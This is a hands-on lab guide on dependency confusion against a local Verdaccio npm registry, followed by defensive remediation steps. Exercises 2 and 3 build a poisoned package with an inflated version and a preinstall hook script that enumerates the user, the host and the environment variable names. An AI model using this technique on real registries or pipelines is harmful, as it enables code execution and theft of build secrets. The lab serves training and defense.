# Supply Chain Security: Verdaccio Registry & Dependency Confusion Lab

## Overview

Software supply chain attacks have emerged as one of the most critical threats facing modern engineering organizations. Rather than attacking hardened perimeter firewalls, attackers target the third-party libraries, CI/CD package dependencies, and private registries that developer workstations and automated build pipelines consume without question.

This lab simulates an enterprise private npm registry using **Verdaccio** and demonstrates the seminal **Dependency Confusion** attack methodology uncovered by security researcher Alex Birsan (which earned over $130,000 in bug bounties from Apple, Microsoft, Tesla, Yelp, and PayPal).

- **Registry Web UI**: [http://localhost:8110](http://localhost:8110)
- **Container Name**: `cyberlab_verdaccio_registry`
- **Docker Image**: `verdaccio/verdaccio:latest`
- **Directory**: `Real_World_Industry_Labs/03_devsecops_ci_cd_poisoning/supply_chain_verdaccio`
- **Lab Shortcut**: `./lab start verdaccio`

---

## Supply Chain Architecture & Attack Flow

```
+-------------------------------------------------------------------------------------------------------+
|                                    Enterprise Developer / CI/CD Pipeline                              |
|                                         (npm install / npm ci)                                        |
+---------------------------------------------------+---------------------------------------------------+
                                                    |
                                                    v
                                  +-----------------------------------+
                                  |    Internal Private Registry      |
                                  |     (Verdaccio on Port 8110)      |
                                  +-----------------+-----------------+
                                                    |
                         +--------------------------+--------------------------+
                         |                                                     |
                         v                                                     v
          [ Internal Storage ]                                  [ Upstream Proxy Uplink ]
          - Legitimate internal package                         - Queries public registry (npmjs.org)
          - e.g. "corp-billing-sdk@1.0.0"                       - Attacker registered "corp-billing-sdk@99.0.0"
                         |                                                     |
                         +--------------------------+--------------------------+
                                                    |
                                                    v
                                      +---------------------------+
                                      |   Version Precedence Win  |
                                      |  npm selects 99.0.0 (High)|
                                      +-------------+-------------+
                                                    |
                                                    v
                                      +---------------------------+
                                      |  Lifecycle Script RCE     |
                                      | "preinstall": "node pwn"  |
                                      | Exfiltrates CI/CD secrets |
                                      +---------------------------+
```

---

## Lab Execution & Quick Start

```bash
# Navigate to the lab directory
cd Real_World_Industry_Labs/03_devsecops_ci_cd_poisoning/supply_chain_verdaccio

# Start Verdaccio registry
docker compose up -d

# Verify registry is running
curl -I http://localhost:8110/
```

Access the Verdaccio Web UI in your browser at [http://localhost:8110](http://localhost:8110).

---

## Step-by-Step Hands-On Exploitation

### Exercise 1: Registering Internal Developer User & Publishing Private Package

Simulate normal enterprise development where an engineer publishes a proprietary package intended only for internal microservices:

1. Point your npm client at the local Verdaccio registry:
   ```bash
   export NPM_REGISTRY="http://localhost:8110"
   npm config set registry $NPM_REGISTRY
   ```
2. Create an internal user account on Verdaccio:
   ```bash
   npm adduser --registry $NPM_REGISTRY
   # Enter username: dev, password: password123, email: dev@corp.local
   ```
3. Create the legitimate internal company library (`corp-auth-utils` version `1.0.0`):
   ```bash
   mkdir -p /tmp/corp-auth-utils && cd /tmp/corp-auth-utils
   cat << 'EOF' > package.json
   {
     "name": "corp-auth-utils",
     "version": "1.0.0",
     "description": "Proprietary corporate auth middleware",
     "main": "index.js",
     "scripts": {
       "test": "echo \"ok\""
     }
   }
   EOF

   cat << 'EOF' > index.js
   module.exports = function authenticate(user, token) {
     return token === "secret-internal-key";
   };
   EOF

   # Publish legitimate internal package
   npm publish --registry $NPM_REGISTRY
   ```
4. Verify the package is listed at [http://localhost:8110](http://localhost:8110).

---

### Exercise 2: Dependency Confusion & Package Poisoning

Attackers scan public git repositories, exposed frontend source maps, or public `.json` build manifests to uncover unscoped internal package names (such as `corp-auth-utils`).

Because the internal developers did not use a verified npm organization scope (e.g., `@mycompany/corp-auth-utils`), any package manager resolving dependencies will prefer the highest semantic version number available across registries.

1. Create the poisoned attacker package with an artificially inflated version (`99.0.0`):
   ```bash
   mkdir -p /tmp/evil-auth-utils && cd /tmp/evil-auth-utils
   cat << 'EOF' > package.json
   {
     "name": "corp-auth-utils",
     "version": "99.0.0",
     "description": "Backdoored package via dependency confusion",
     "main": "index.js",
     "scripts": {
       "preinstall": "node pwn.js"
     }
   }
   EOF

   cat << 'EOF' > pwn.js
   const os = require('os');
   const fs = require('fs');

   console.log('\n======================================================');
   console.log('[!] ATTACK SUCCESSFUL: Lifecycle script RCE triggered!');
   console.log('[*] Current User  :', os.userInfo().username);
   console.log('[*] Hostname      :', os.hostname());
   console.log('[*] Environment   :', Object.keys(process.env).join(', '));
   console.log('======================================================\n');
   EOF
   ```
2. In real-world attacks, the attacker publishes this to the public `npmjs.org` registry. For our isolated lab simulation, register an attacker account and publish version `99.0.0` to Verdaccio:
   ```bash
   npm publish --registry $NPM_REGISTRY
   ```

---

### Exercise 3: Triggering Unauthenticated RCE in CI/CD Build Simulation

Simulate a continuous integration (CI/CD) pipeline running `npm install` for an internal microservice:

1. Create a client project that declares a dependency on the internal library:
   ```bash
   mkdir -p /tmp/corp-microservice && cd /tmp/corp-microservice
   cat << 'EOF' > package.json
   {
     "name": "corp-microservice",
     "version": "1.0.0",
     "dependencies": {
       "corp-auth-utils": "^1.0.0"
     }
   }
   EOF
   ```
2. Run `npm install` as the build runner:
   ```bash
   npm install --registry $NPM_REGISTRY
   ```
3. Observe the output:
   - Notice that npm evaluated the caret semver `^1.0.0` and automatically resolved version `99.0.0`!
   - Notice that during installation, npm automatically executed `pwn.js` defined in the `"preinstall"` script hook.
   - Any credentials in the environment (`AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN`, `DATABASE_URL`) could be silently transmitted to an attacker's C2 server.

---

## Defensive Engineering & Remediation

### 1. Mandatory Scoped Packages

Never use unscoped global package names for private code. Prefix all internal packages with an organization scope owned by your company on public `npmjs.com`:

```json
{
  "name": "@mycorp/auth-utils",
  "version": "1.0.0"
}
```

Public npm enforces that only authorized organization members can publish packages beginning with `@mycorp/`.

### 2. Explicit Registry Scoping in `.npmrc`

Bind your internal scope exclusively to your internal Verdaccio registry:

```ini
# .npmrc
registry=https://registry.npmjs.org/
@mycorp:registry=http://localhost:8110/
always-auth=true
```

### 3. Registry Uplink Isolation (Verdaccio Configuration)

Configure Verdaccio to **never** query upstream public proxies for your internal scope:

```yaml
# config.yaml
packages:
  "@mycorp/*":
    access: $authenticated
    publish: $authenticated
    # Crucial: omit 'proxy: npmjs' so Verdaccio never asks npmjs for @mycorp packages
  "**":
    access: $all
    publish: $authenticated
    proxy: npmjs
```

### 4. Disabling Build Scripts in Production / CI

Prevent unvetted code execution during build steps:

```bash
npm install --ignore-scripts
# Or using modern pnpm with strict script execution policies
```

### 5. Enforcing Lockfiles with Hash Verification

Always use `npm ci` rather than `npm install` in CI/CD pipelines to ensure dependencies strictly match the pinned cryptographic integrity hashes (`sha512-...`) recorded in `package-lock.json`.

---

## Verified YouTube Walkthroughs & Solving Guides

All video links have been verified active via YouTube oEmbed API (`HTTP 200 OK`):

- [Bug Bounty Reports Explained - $130,000+ Learn New Hacking Technique in 2021 - Dependency Confusion](https://www.youtube.com/watch?v=zFHJwehpBrU) — Comprehensive breakdown of Alex Birsan's original research, explaining how major tech companies were compromised.
- [John Hammond - Dependency Confusion with AWS CodeArtifact](https://www.youtube.com/watch?v=FBWpX8icMMo) — Practical hands-on demonstration of dependency confusion, package publishing, and package.json script execution.
- [Infosec talk - Dependency Confusion - Explained](https://www.youtube.com/watch?v=JinJ_6EQ--s) — Architectural overview of package manager resolution logic and registry proxying vulnerabilities.
- [DevOps Interview Cloud - Dependency Confusion Attack Explained DevOps](https://www.youtube.com/watch?v=7-6iRTQ49_Q) — Clear tutorial illustrating how upstream proxy fallbacks cause pipeline compromise.

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Start Verdaccio registry
./lab start verdaccio

# Check status
./lab status

# Open interactive shell inside Verdaccio container
./lab shell verdaccio

# Stop Verdaccio
./lab stop verdaccio
```
